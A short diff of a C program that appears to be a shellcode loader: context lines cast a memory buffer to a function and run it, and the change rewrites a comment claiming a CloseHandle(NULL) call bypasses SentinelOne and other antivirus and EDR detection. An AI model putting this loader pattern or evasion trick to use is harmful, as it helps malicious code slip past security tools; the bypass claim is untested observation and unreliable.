@@ -51,6 +51,6 @@ int main(int argc, char **argv) {
     ((void(*)())shellcode_pointer)();
 
     free(shellcode_pointer);
-    CloseHandle(NULL);  // bypass SentinelOne
+    CloseHandle(NULL);  // this line bypass some Antivirus and EDR detection (i don't have any explanation for EDR bypass, i just observed it)
     return 0;
 }
